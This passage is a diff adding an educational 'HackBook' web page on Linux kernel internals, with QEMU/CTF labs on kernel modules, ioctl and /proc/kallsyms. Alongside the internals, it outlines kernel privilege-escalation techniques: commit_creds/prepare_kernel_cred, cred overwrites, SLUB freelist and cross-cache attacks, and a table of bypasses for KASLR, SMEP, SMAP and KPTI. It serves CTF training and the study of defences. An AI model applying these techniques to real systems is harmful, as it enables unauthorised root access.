@@ -1,0 +1,1685 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        (function() {
+        const base = document.createElement('base');
+        if(location.hostname.includes('github.io')){
+          base.href = `/HackBook/`;
+        }else{
+          const pathSegments = window.location.pathname.split('/').filter(element => element !== "");
+          const index = pathSegments.indexOf('HackBook');
+          pathSegments.splice(index + 1, pathSegments.length - (index + 1));
+          base.href = pathSegments.join('/') + '/';
+        }
+        document.head.appendChild(base);
+      })();
+    </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/x-icon" href="assets/images/hacker.jpg">
+  <title>HackBook | Kernel Fundamentals</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-c.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <script src="assets/scripts/main.js"></script>
+  <link rel="stylesheet" href="assets/styles/styles.css">
+</head>
+<body>
+  <div class="content">
+    <h1>Linux Kernel Fundamentals</h1>
+    <hr>
+
+    <div class="tab-container">
+      <div class="tab-buttons">
+        <button class="tab-btn active" data-tab="notes">Notes</button>
+        <button class="tab-btn" data-tab="lab">Lab</button>
+        <button class="tab-btn" data-tab="ctf">CTF Challenges</button>
+      </div>
+
+      <!-- NOTES TAB -->
+      <div class="tab-content active" id="notes">
+
+        <h2>Kernel Architecture</h2>
+        <p>Linux is a <strong>monolithic kernel</strong> — all core services (scheduler, VFS, networking, drivers) run in a single address space at ring 0. Loadable kernel modules (LKMs) extend functionality at runtime without recompilation.</p>
+<pre><code class="language-bash">┌─────────────────────────────────────────────────┐
+│  Userspace  (Ring 3)                            │
+│  applications, libc, system daemons             │
+├─────────────────────────────────────────────────┤
+│  Syscall interface  (SYSCALL instruction)       │
+├─────────────────────────────────────────────────┤
+│  Kernel  (Ring 0)                               │
+│  ┌──────────┬──────────┬──────────┬───────────┐ │
+│  │Scheduler │   VFS    │ Net Stack│  Drivers  │ │
+│  ├──────────┼──────────┼──────────┼───────────┤ │
+│  │   MM     │  IPC     │ Security │  Modules  │ │
+│  └──────────┴──────────┴──────────┴───────────┘ │
+├─────────────────────────────────────────────────┤
+│  Hardware                                       │
+└─────────────────────────────────────────────────┘</code></pre>
+
+        <h3>User/Kernel Boundary</h3>
+        <table>
+          <tr><th>Property</th><th>Userspace</th><th>Kernel</th></tr>
+          <tr><td>Ring</td><td>Ring 3 (CPL=3)</td><td>Ring 0 (CPL=0)</td></tr>
+          <tr><td>Address range</td><td><code>0x0000000000000000</code> – <code>0x00007fffffffffff</code></td><td><code>0xffff800000000000</code> – <code>0xffffffffffffffff</code></td></tr>
+          <tr><td>Access</td><td>Limited — must use syscalls</td><td>Full hardware access</td></tr>
+          <tr><td>Fault behavior</td><td>SIGSEGV → process dies</td><td>Kernel panic / oops</td></tr>
+        </table>
+
+        <h2>Syscall Mechanism</h2>
+        <p>On x86_64 Linux, userspace invokes syscalls via the <code>syscall</code> instruction. The CPU loads the handler address from <code>MSR_LSTAR</code> (MSR <code>0xC0000082</code>), which points to <code>entry_SYSCALL_64</code>.</p>
+<pre><code class="language-c">// Syscall flow:
+// 1. User puts syscall number in RAX, args in RDI, RSI, RDX, R10, R8, R9
+// 2. Executes SYSCALL instruction
+// 3. CPU: saves RIP→RCX, RFLAGS→R11, loads RIP from MSR_LSTAR
+// 4. entry_SYSCALL_64 runs → swapgs, switch to kernel stack
+// 5. Dispatches via sys_call_table[rax]
+// 6. Returns via SYSRET (or IRET if signal pending)</code></pre>
+<pre><code class="language-bash"># Read MSR_LSTAR (requires root)
+rdmsr 0xC0000082
+
+# View syscall table (if kallsyms available)
+cat /proc/kallsyms | grep sys_call_table
+
+# Trace syscalls of a process
+strace -f -e trace=all ./binary
+strace -c ./binary          # summary/count mode</code></pre>
+
+        <h3>Syscall Table</h3>
+<pre><code class="language-bash"># Common x86_64 syscall numbers
+# 0   sys_read        1   sys_write       2   sys_open
+# 3   sys_close       9   sys_mmap        10  sys_mprotect
+# 39  sys_getpid      57  sys_fork        59  sys_execve
+# 60  sys_exit        62  sys_kill        101 sys_ptrace
+# 175 sys_init_module 176 sys_delete_module
+# 16  sys_ioctl
+
+# Full table:
+cat /usr/include/asm/unistd_64.h
+# Or: ausyscall --dump</code></pre>
+
+        <h2>Kernel Memory Layout</h2>
+        <p>The kernel occupies the upper half of the 64-bit virtual address space (canonical high addresses).</p>
+<pre><code class="language-bash">0xffff800000000000  ┌──────────────────────────┐
+                    │ Direct mapping of all     │  page_offset_base
+                    │ physical memory           │  (64 TB region)
+                    │ phys_to_virt(addr) =      │
+                    │   addr + page_offset_base │
+0xffffc80000000000  ├──────────────────────────┤
+                    │ Hole                      │
+0xffffc90000000000  ├──────────────────────────┤
+                    │ vmalloc / ioremap area    │  VMALLOC_START
+                    │ vmalloc(), ioremap()      │  (32 TB)
+0xffffe90000000000  ├──────────────────────────┤
+                    │ Hole                      │
+0xffffea0000000000  ├──────────────────────────┤
+                    │ vmemmap (struct page[])   │  virtual mem map
+0xffffeb0000000000  ├──────────────────────────┤
+                    │ Hole                      │
+0xffffffff80000000  ├──────────────────────────┤
+                    │ Kernel text (vmlinux)     │  __START_KERNEL_map
+                    │ .text, .rodata, .data     │
+0xffffffffa0000000  ├──────────────────────────┤
+                    │ Module mapping space      │  MODULES_VADDR
+0xffffffffc0000000  ├──────────────────────────┤
+                    │ Fixmap, VSYSCALL, etc.    │
+0xffffffffffffffff  └──────────────────────────┘</code></pre>
+<pre><code class="language-bash"># View actual kernel memory layout
+cat /proc/iomem                # physical memory map
+cat /sys/kernel/debug/kernel_page_tables  # requires debugfs
+sudo cat /proc/vmallocinfo     # vmalloc allocations</code></pre>
+
+        <h2>Process Management</h2>
+        <h3>task_struct</h3>
+        <p>Every process/thread is represented by a <code>task_struct</code> (~6KB). Key fields for exploitation:</p>
+<pre><code class="language-c">struct task_struct {
+    // ... scheduling, state ...
+    pid_t                   pid;
+    pid_t                   tgid;          // thread group id
+    struct task_struct      *parent;
+    struct list_head        children;
+    struct mm_struct        *mm;           // memory descriptor (NULL for kernel threads)
+    const struct cred       *cred;         // effective credentials ← exploit target
+    const struct cred       *real_cred;    // objective credentials
+    char                    comm[TASK_COMM_LEN]; // executable name
+    struct files_struct     *files;        // open file descriptors
+    struct nsproxy          *nsproxy;      // namespaces
+    // ...
+};</code></pre>
+
+        <h3>cred Structure</h3>
+        <p>The <code>cred</code> struct holds all privilege information. Overwriting it is the classic kernel exploit goal.</p>
+<pre><code class="language-c">struct cred {
+    kuid_t  uid;    // real UID
+    kgid_t  gid;    // real GID
+    kuid_t  suid;   // saved UID
+    kgid_t  sgid;   // saved GID
+    kuid_t  euid;   // effective UID  ← if 0, you're root
+    kgid_t  egid;   // effective GID
+    kuid_t  fsuid;  // filesystem UID
+    kgid_t  fsgid;  // filesystem GID
+    kernel_cap_t cap_inheritable;
+    kernel_cap_t cap_permitted;
+    kernel_cap_t cap_effective;   // active capabilities
+    // ...
+};
+
+// Privilege escalation primitives:
+// commit_creds(prepare_kernel_cred(NULL))  → instant root
+// Or: overwrite cred->uid/euid/... to 0</code></pre>
+
+        <h3>Capabilities</h3>
+<pre><code class="language-bash"># View process capabilities
+cat /proc/self/status | grep Cap
+# CapInh: 0000000000000000
+# CapPrm: 0000000000000000
+# CapEff: 0000000000000000
+
+# Decode capability bitmask
+capsh --decode=0000003fffffffff
+
+# Key capabilities for exploitation:
+# CAP_SYS_ADMIN   (21) — mount, bpf, namespace ops
+# CAP_SYS_PTRACE  (19) — ptrace any process
+# CAP_SYS_MODULE  (16) — load kernel modules
+# CAP_SYS_RAWIO   (17) — iopl, ioperm, /dev/mem
+# CAP_NET_RAW     (13) — raw sockets
+# CAP_DAC_OVERRIDE (1) — bypass file permissions</code></pre>
+
+        <h2>Kernel Modules</h2>
+        <h3>Building a Basic Module</h3>
+<pre><code class="language-c">// hello.c
+#include &lt;linux/module.h&gt;
+#include &lt;linux/kernel.h&gt;
+#include &lt;linux/init.h&gt;
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("hacker");
+
+static int __init hello_init(void) {
+    printk(KERN_INFO "hello: module loaded\n");
+    return 0;
+}
+
+static void __exit hello_exit(void) {
+    printk(KERN_INFO "hello: module unloaded\n");
+}
+
+module_init(hello_init);
+module_exit(hello_exit);</code></pre>
+<pre><code class="language-bash"># Makefile
+obj-m += hello.o
+
+all:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+clean:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+
+# Build and load
+make
+sudo insmod hello.ko
+dmesg | tail
+sudo rmmod hello
+lsmod | grep hello</code></pre>
+
+        <h3>Character Device with ioctl</h3>
+<pre><code class="language-c">// vuln_device.c — typical CTF kernel module pattern
+#include &lt;linux/module.h&gt;
+#include &lt;linux/fs.h&gt;
+#include &lt;linux/miscdevice.h&gt;
+#include &lt;linux/uaccess.h&gt;
+
+#define DEVICE_NAME "vuln"
+#define IOCTL_READ  0x1337
+#define IOCTL_WRITE 0x1338
+
+static char kernel_buffer[256];
+
+static long vuln_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
+    switch (cmd) {
+        case IOCTL_READ:
+            if (copy_to_user((char __user *)arg, kernel_buffer, 256))
+                return -EFAULT;
+            break;
+        case IOCTL_WRITE:
+            if (copy_from_user(kernel_buffer, (char __user *)arg, 256))
+                return -EFAULT;
+            break;
+        default:
+            return -EINVAL;
+    }
+    return 0;
+}
+
+static struct file_operations vuln_fops = {
+    .owner = THIS_MODULE,
+    .unlocked_ioctl = vuln_ioctl,
+};
+
+static struct miscdevice vuln_misc = {
+    .minor = MISC_DYNAMIC_MINOR,
+    .name  = DEVICE_NAME,
+    .fops  = &amp;vuln_fops,
+};
+
+module_init(/* register misc_register(&amp;vuln_misc) */);
+module_exit(/* misc_deregister(&amp;vuln_misc) */);</code></pre>
+
+        <h3>Interacting from Userspace</h3>
+<pre><code class="language-c">// interact.c
+#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;sys/ioctl.h&gt;
+
+#define IOCTL_READ  0x1337
+#define IOCTL_WRITE 0x1338
+
+int main() {
+    int fd = open("/dev/vuln", O_RDWR);
+    if (fd &lt; 0) { perror("open"); return 1; }
+
+    char buf[256] = "AAAA";
+    ioctl(fd, IOCTL_WRITE, buf);      // write to kernel
+    memset(buf, 0, 256);
+    ioctl(fd, IOCTL_READ, buf);       // read from kernel
+    printf("Read: %s\n", buf);
+
+    close(fd);
+    return 0;
+}</code></pre>
+
+        <h2>SLAB/SLUB Allocator</h2>
+        <p>The kernel uses SLUB (the default) for small, frequent allocations. Objects of similar size share <strong>slab caches</strong>.</p>
+<pre><code class="language-bash"># View slab caches
+cat /proc/slabinfo
+# Or with slabtop
+sudo slabtop
+
+# Key caches for exploitation:
+# kmalloc-32, kmalloc-64, ..., kmalloc-4096  — generic caches
+# cred_jar          — credential structures
+# task_struct        — process descriptors
+# files_cache        — file descriptor tables
+# filp               — struct file objects</code></pre>
+<pre><code class="language-c">// SLUB internals
+// Each cache has per-CPU slabs for fast alloc (no locking)
+// Free objects are linked via a freelist pointer stored IN the object:
+//
+//   ┌─────────┬─────────┬─────────┬─────────┐
+//   │ obj 0   │ obj 1   │ obj 2   │ obj 3   │  ← slab page
+//   │ next→1  │ next→2  │ next→3  │ next→∅  │  ← freelist chain
+//   └─────────┴─────────┴─────────┴─────────┘
+//
+// Alloc: pop head of freelist
+// Free:  push onto freelist head
+//
+// Attack: corrupt freelist pointer → allocate arbitrary memory</code></pre>
+
+        <h3>Cross-Cache Attacks</h3>
+<pre><code class="language-c">// If vuln object is in kmalloc-256 and you want to overlap with cred:
+// 1. Spray cred structs (fork many processes)
+// 2. Free some → holes in cred_jar
+// 3. Trigger vuln alloc that lands in same page (cross-cache)
+// 4. Overwrite cred fields via vuln object
+//
+// Modern defenses: CONFIG_SLAB_VIRTUAL, random freelists
+// Need to drain specific caches and force page reuse</code></pre>
+
+        <h2>Kernel Security Mitigations</h2>
+        <table>
+          <tr><th>Mitigation</th><th>What It Does</th><th>Bypass</th></tr>
+          <tr><td><strong>KASLR</strong></td><td>Randomizes kernel base address at boot</td><td>Leak from <code>/proc</code>, side channels, info leaks in drivers</td></tr>
+          <tr><td><strong>SMEP</strong></td><td>Kernel can't execute userspace pages (CR4 bit 20)</td><td>ROP in kernel, flip CR4 bit, <code>native_write_cr4()</code></td></tr>
+          <tr><td><strong>SMAP</strong></td><td>Kernel can't read/write userspace pages (CR4 bit 21)</td><td>Kernel ROP, <code>copy_from/to_user</code> gadgets</td></tr>
+          <tr><td><strong>KPTI</strong></td><td>Separate page tables for user/kernel (Meltdown fix)</td><td>Must use <code>swapgs_restore_regs_and_return_to_usermode</code> trampoline when returning to user</td></tr>
+          <tr><td><strong>Stack Canaries</strong></td><td><code>__stack_chk_fail</code> on stack smash</td><td>Leak canary, avoid overwriting it</td></tr>
+          <tr><td><strong>CFI</strong></td><td>Control-flow integrity — validates indirect call targets</td><td>Call compliant targets, data-only attacks</td></tr>
+          <tr><td><strong>RANDSTRUCT</strong></td><td>Randomizes struct field order at compile time</td><td>Leak struct layout, brute force offsets</td></tr>
+          <tr><td><strong>STATIC_USERMODEHELPER</strong></td><td>Locks <code>modprobe_path</code> to a fixed value</td><td>Can't overwrite <code>modprobe_path</code></td></tr>
+        </table>
+<pre><code class="language-bash"># Check kernel config for mitigations
+cat /boot/config-$(uname -r) | grep -E "KASLR|SMEP|SMAP|KPTI|STACKPROTECTOR|CFI|RANDSTRUCT"
+# Or from within QEMU CTF:
+zcat /proc/config.gz | grep -E "KASLR|SMEP|SMAP|KPTI|STACKPROTECTOR"</code></pre>
+
+        <h2>CTF Kernel Challenge Environment</h2>
+        <p>Kernel CTF challenges typically run in QEMU with a minimal Linux environment (busybox).</p>
+<pre><code class="language-bash"># Typical CTF file layout:
+# run.sh / launch.sh     — QEMU launch script
+# vmlinuz / bzImage       — compressed kernel image
+# initramfs.cpio.gz       — root filesystem (busybox)
+# vuln.ko                 — vulnerable kernel module (inside initramfs)
+
+# Common QEMU launch command:
+qemu-system-x86_64 \
+    -m 128M \
+    -kernel ./vmlinuz \
+    -initrd ./initramfs.cpio.gz \
+    -append "console=ttyS0 quiet loglevel=3 oops=panic panic=-1 kaslr" \
+    -nographic \
+    -monitor /dev/null \
+    -no-reboot \
+    -cpu qemu64,+smep,+smap \
+    -s                           # GDB server on :1234</code></pre>
+
+        <h3>Extracting and Repacking initramfs</h3>
+<pre><code class="language-bash"># Extract
+mkdir initramfs &amp;&amp; cd initramfs
+zcat ../initramfs.cpio.gz | cpio -idmv
+
+# Examine init script — shows module loading, flag location, permissions
+cat init
+
+# Modify (e.g., add your exploit, change permissions)
+# Repack
+find . -print0 | cpio --null -ov --format=newc | gzip -9 &gt; ../initramfs_new.cpio.gz</code></pre>
+
+        <h3>Compiling Exploits for CTF</h3>
+<pre><code class="language-bash"># Static compile (busybox environments have no libc)
+gcc -o exploit exploit.c -static -lpthread
+# or with musl:
+musl-gcc -o exploit exploit.c -static
+
+# Copy into initramfs
+cp exploit initramfs/home/user/
+# Repack and launch</code></pre>
+
+        <h2>Debugging Kernel with GDB</h2>
+<pre><code class="language-bash"># 1. Launch QEMU with GDB stub
+qemu-system-x86_64 ... -s -S
+# -s: GDB on localhost:1234
+# -S: freeze at startup (wait for GDB attach)
+
+# 2. In another terminal
+gdb ./vmlinux          # uncompressed kernel with symbols
+(gdb) target remote :1234
+(gdb) continue
+
+# If you only have vmlinuz/bzImage:
+# Extract vmlinux from compressed kernel
+vmlinux-to-elf vmlinuz vmlinux
+# Or:
+extract-vmlinux vmlinuz &gt; vmlinux</code></pre>
+
+        <h3>Useful GDB Commands for Kernel</h3>
+<pre><code class="language-bash"># Break on module functions
+(gdb) add-symbol-file vuln.ko 0x&lt;module_base&gt;
+(gdb) b vuln_ioctl
+
+# Find module base from inside QEMU:
+cat /proc/modules | grep vuln
+# Or:
+cat /sys/module/vuln/sections/.text
+
+# Examine kernel structures
+(gdb) p *(struct task_struct *)0xffff...
+(gdb) p ((struct task_struct *)0xffff...)-&gt;cred-&gt;uid
+
+# View kallsyms
+(gdb) x/gx &amp;sys_call_table
+(gdb) p prepare_kernel_cred
+(gdb) p commit_creds</code></pre>
+
+        <h3>/proc/kallsyms</h3>
+<pre><code class="language-bash"># Lists all kernel symbols with addresses
+cat /proc/kallsyms | head
+# ffffffff81000000 T _stext
+# ffffffff81000000 T startup_64
+
+# Key symbols to find for exploits:
+cat /proc/kallsyms | grep -E "prepare_kernel_cred|commit_creds"
+cat /proc/kallsyms | grep sys_call_table
+cat /proc/kallsyms | grep modprobe_path
+
+# Note: unprivileged users see 0x0000000000000000 when
+# /proc/sys/kernel/kptr_restrict = 1 (default)
+# CTF challenges often set kptr_restrict=0 in init</code></pre>
+
+        <h2>/proc and /sys Filesystem</h2>
+        <table>
+          <tr><th>Path</th><th>Info</th></tr>
+          <tr><td><code>/proc/[pid]/maps</code></td><td>Virtual memory mappings</td></tr>
+          <tr><td><code>/proc/[pid]/status</code></td><td>Process status, UIDs, capabilities</td></tr>
+          <tr><td><code>/proc/[pid]/mem</code></td><td>Direct process memory access (with ptrace or same UID)</td></tr>
+          <tr><td><code>/proc/kallsyms</code></td><td>Kernel symbol table with addresses</td></tr>
+          <tr><td><code>/proc/modules</code></td><td>Loaded modules and their base addresses</td></tr>
+          <tr><td><code>/proc/slabinfo</code></td><td>Slab allocator cache stats</td></tr>
+          <tr><td><code>/proc/version</code></td><td>Kernel version string</td></tr>
+          <tr><td><code>/proc/config.gz</code></td><td>Kernel build configuration (if enabled)</td></tr>
+          <tr><td><code>/proc/sys/kernel/kptr_restrict</code></td><td>Controls kallsyms visibility (0=visible, 1=hidden, 2=hidden for all)</td></tr>
+          <tr><td><code>/sys/module/&lt;name&gt;/sections/.text</code></td><td>Module .text base address</td></tr>
+          <tr><td><code>/sys/kernel/debug/</code></td><td>debugfs — SLUB debug, page tables, etc.</td></tr>
+        </table>
+
+        <h2>Netfilter / iptables (Kernel Perspective)</h2>
+        <p>Netfilter provides hooks in the kernel network stack. Packets traverse a chain of hooks at defined points:</p>
+<pre><code class="language-bash"># Hook points in packet flow:
+# PREROUTING → ROUTING → FORWARD → POSTROUTING  (forwarded packets)
+#                       → INPUT   → local process → OUTPUT → POSTROUTING
+
+# Each hook can: NF_ACCEPT, NF_DROP, NF_QUEUE, NF_STOLEN
+
+# Kernel module registering a netfilter hook:
+# nf_register_net_hook(net, &amp;nfho);</code></pre>
+<pre><code class="language-c">// Registering a netfilter hook in a module
+#include &lt;linux/netfilter.h&gt;
+#include &lt;linux/netfilter_ipv4.h&gt;
+
+static unsigned int hook_func(void *priv, struct sk_buff *skb,
+                              const struct nf_hook_state *state) {
+    // inspect/modify packet
+    return NF_ACCEPT;  // or NF_DROP
+}
+
+static struct nf_hook_ops nfho = {
+    .hook     = hook_func,
+    .pf       = PF_INET,
+    .hooknum  = NF_INET_PRE_ROUTING,
+    .priority = NF_IP_PRI_FIRST,
+};</code></pre>
+
+        <h2>Namespaces and cgroups</h2>
+        <h3>Namespaces</h3>
+        <p>Namespaces isolate system resources per-process. Each type gives a process its own view of a global resource:</p>
+        <table>
+          <tr><th>Namespace</th><th>Flag</th><th>Isolates</th></tr>
+          <tr><td>Mount</td><td><code>CLONE_NEWNS</code></td><td>Filesystem mount points</td></tr>
+          <tr><td>PID</td><td><code>CLONE_NEWPID</code></td><td>Process IDs</td></tr>
+          <tr><td>Network</td><td><code>CLONE_NEWNET</code></td><td>Network stack, interfaces, iptables</td></tr>
+          <tr><td>User</td><td><code>CLONE_NEWUSER</code></td><td>UID/GID mappings (unprivileged root)</td></tr>
+          <tr><td>UTS</td><td><code>CLONE_NEWUTS</code></td><td>Hostname, domain name</td></tr>
+          <tr><td>IPC</td><td><code>CLONE_NEWIPC</code></td><td>System V IPC, POSIX message queues</td></tr>
+          <tr><td>Cgroup</td><td><code>CLONE_NEWCGROUP</code></td><td>Cgroup root directory</td></tr>
+        </table>
+<pre><code class="language-bash"># View process namespaces
+ls -la /proc/self/ns/
+
+# Create new namespace
+unshare -Urn    # user + network namespace, map root
+# Inside: uid 0 (root) but only in this namespace
+
+# Enter another process's namespace
+nsenter -t &lt;pid&gt; -m -u -i -n -p</code></pre>
+
+        <h3>cgroups</h3>
+<pre><code class="language-bash"># cgroups v2 — limit resources per process group
+# Mount point: /sys/fs/cgroup/
+
+# View current cgroup
+cat /proc/self/cgroup
+
+# Key controllers:
+# memory — memory.max, memory.current
+# cpu    — cpu.max (quota period)
+# pids   — pids.max
+# io     — io.max
+
+# Example: limit memory to 100MB
+mkdir /sys/fs/cgroup/test
+echo "100M" &gt; /sys/fs/cgroup/test/memory.max
+echo $$ &gt; /sys/fs/cgroup/test/cgroup.procs</code></pre>
+
+        <h2>seccomp-bpf</h2>
+        <p>seccomp (Secure Computing) restricts which syscalls a process can make. BPF filters inspect syscall number and arguments.</p>
+<pre><code class="language-c">// seccomp strict mode — only read/write/exit/sigreturn
+prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT);
+
+// seccomp-bpf — custom filter
+#include &lt;linux/seccomp.h&gt;
+#include &lt;linux/filter.h&gt;
+#include &lt;sys/prctl.h&gt;
+
+struct sock_filter filter[] = {
+    BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),
+    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_execve, 0, 1),
+    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),   // kill on execve
+    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),   // allow everything else
+};
+struct sock_fprog prog = { .len = 4, .filter = filter };
+
+prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
+prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog);</code></pre>
+<pre><code class="language-bash"># Dump seccomp filter of a process
+cat /proc/&lt;pid&gt;/status | grep Seccomp
+# 0 = disabled, 1 = strict, 2 = filter
+
+# Use seccomp-tools to dump BPF rules (CTF essential)
+seccomp-tools dump ./binary</code></pre>
+
+      </div>
+
+      <!-- LAB TAB -->
+      <div class="tab-content" id="lab">
+        <h2>Labs</h2>
+
+        <div class="lab-card">
+          <h4>Lab 1: Build and Load a Custom Kernel Module</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Write a simple kernel module that logs a message on load/unload. Build it, load it with <code>insmod</code>, verify with <code>dmesg</code>, and remove it.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// lab_hello.c
+#include &lt;linux/module.h&gt;
+#include &lt;linux/kernel.h&gt;
+#include &lt;linux/init.h&gt;
+
+MODULE_LICENSE("GPL");
+
+static int __init lab_hello_init(void) {
+    printk(KERN_INFO "lab_hello: Hello from kernel space! PID=%d\n", current-&gt;pid);
+    return 0;
+}
+
+static void __exit lab_hello_exit(void) {
+    printk(KERN_INFO "lab_hello: Goodbye from kernel space!\n");
+}
+
+module_init(lab_hello_init);
+module_exit(lab_hello_exit);</code></pre>
+<pre><code class="language-bash"># Makefile
+obj-m += lab_hello.o
+all:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+# Steps:
+make
+sudo insmod lab_hello.ko
+dmesg | tail -5         # verify "Hello from kernel space!"
+lsmod | grep lab_hello  # verify loaded
+sudo rmmod lab_hello
+dmesg | tail -5         # verify "Goodbye"</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 2: Set Up QEMU + Busybox CTF Environment</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Build a minimal QEMU environment from scratch — compile a kernel, create a busybox initramfs, boot into it, and verify you can run commands.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># 1. Download and compile kernel
+wget https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-6.6.tar.xz
+tar xf linux-6.6.tar.xz &amp;&amp; cd linux-6.6
+make defconfig
+# Enable useful debug options:
+scripts/config --enable CONFIG_DEBUG_INFO
+scripts/config --enable CONFIG_GDB_SCRIPTS
+scripts/config --enable CONFIG_PROC_CONFIG_GZ
+make -j$(nproc)
+# Output: arch/x86/boot/bzImage
+
+# 2. Build busybox (static)
+wget https://busybox.net/downloads/busybox-1.36.1.tar.bz2
+tar xf busybox-1.36.1.tar.bz2 &amp;&amp; cd busybox-1.36.1
+make defconfig
+sed -i 's/# CONFIG_STATIC is not set/CONFIG_STATIC=y/' .config
+make -j$(nproc) &amp;&amp; make install
+# Output: _install/
+
+# 3. Create initramfs
+cd _install
+mkdir -p proc sys dev tmp home/user
+cat &gt; init &lt;&lt; 'EOF'
+#!/bin/sh
+mount -t proc proc /proc
+mount -t sysfs sysfs /sys
+mount -t devtmpfs devtmpfs /dev
+echo "Boot complete!"
+setsid cttyhack sh
+poweroff -f
+EOF
+chmod +x init
+find . -print0 | cpio --null -ov --format=newc | gzip -9 &gt; ../initramfs.cpio.gz
+
+# 4. Boot
+qemu-system-x86_64 \
+    -m 256M \
+    -kernel ../linux-6.6/arch/x86/boot/bzImage \
+    -initrd ../initramfs.cpio.gz \
+    -append "console=ttyS0 nokaslr" \
+    -nographic -no-reboot</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 3: Interact with a Kernel Module via ioctl</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Load the provided character device module, then write a userspace program to communicate with it via <code>ioctl()</code>. Read and write data to the kernel buffer.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// lab_device.c — kernel module
+#include &lt;linux/module.h&gt;
+#include &lt;linux/fs.h&gt;
+#include &lt;linux/miscdevice.h&gt;
+#include &lt;linux/uaccess.h&gt;
+
+MODULE_LICENSE("GPL");
+
+#define IOCTL_SET_MSG 0xDEAD
+#define IOCTL_GET_MSG 0xBEEF
+
+static char msg[128] = "default_secret";
+
+static long lab_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
+    switch (cmd) {
+        case IOCTL_SET_MSG:
+            if (copy_from_user(msg, (void __user *)arg, 128)) return -EFAULT;
+            printk(KERN_INFO "lab_device: msg set to '%s'\n", msg);
+            return 0;
+        case IOCTL_GET_MSG:
+            if (copy_to_user((void __user *)arg, msg, 128)) return -EFAULT;
+            return 0;
+        default:
+            return -EINVAL;
+    }
+}
+
+static struct file_operations lab_fops = { .owner = THIS_MODULE, .unlocked_ioctl = lab_ioctl };
+static struct miscdevice lab_misc = { .minor = MISC_DYNAMIC_MINOR, .name = "lab_device", .fops = &amp;lab_fops };
+static int __init lab_init(void) { return misc_register(&amp;lab_misc); }
+static void __exit lab_exit(void) { misc_deregister(&amp;lab_misc); }
+module_init(lab_init);
+module_exit(lab_exit);</code></pre>
+<pre><code class="language-c">// lab_user.c — userspace interaction
+#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/ioctl.h&gt;
+
+#define IOCTL_SET_MSG 0xDEAD
+#define IOCTL_GET_MSG 0xBEEF
+
+int main() {
+    int fd = open("/dev/lab_device", O_RDWR);
+    if (fd &lt; 0) { perror("open"); return 1; }
+
+    // Read default message
+    char buf[128] = {0};
+    ioctl(fd, IOCTL_GET_MSG, buf);
+    printf("Got: %s\n", buf);
+
+    // Write new message
+    strcpy(buf, "hacked!");
+    ioctl(fd, IOCTL_SET_MSG, buf);
+
+    // Read it back
+    memset(buf, 0, 128);
+    ioctl(fd, IOCTL_GET_MSG, buf);
+    printf("Now: %s\n", buf);
+
+    close(fd);
+}</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 4: Explore /proc/kallsyms</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Use <code>/proc/kallsyms</code> to find key kernel function addresses. Locate <code>commit_creds</code>, <code>prepare_kernel_cred</code>, the syscall table, and <code>modprobe_path</code>. Calculate KASLR slide from known base.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Ensure kallsyms are visible (run as root or set kptr_restrict=0)
+echo 0 &gt; /proc/sys/kernel/kptr_restrict
+
+# Find key exploit targets
+grep -E "prepare_kernel_cred|commit_creds" /proc/kallsyms
+grep "sys_call_table" /proc/kallsyms
+grep "modprobe_path" /proc/kallsyms
+grep "_stext" /proc/kallsyms
+
+# Calculate KASLR offset
+# Default kernel base: 0xffffffff81000000
+# Actual _stext address from kallsyms - default base = KASLR slide
+python3 -c "
+stext = 0x$(grep ' T _stext' /proc/kallsyms | awk '{print $1}')
+kaslr_slide = stext - 0xffffffff81000000
+print(f'_stext:      {hex(stext)}')
+print(f'KASLR slide: {hex(kaslr_slide)}')
+"
+
+# Count exported symbols
+wc -l /proc/kallsyms
+grep ' T ' /proc/kallsyms | wc -l   # text (code) symbols only</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
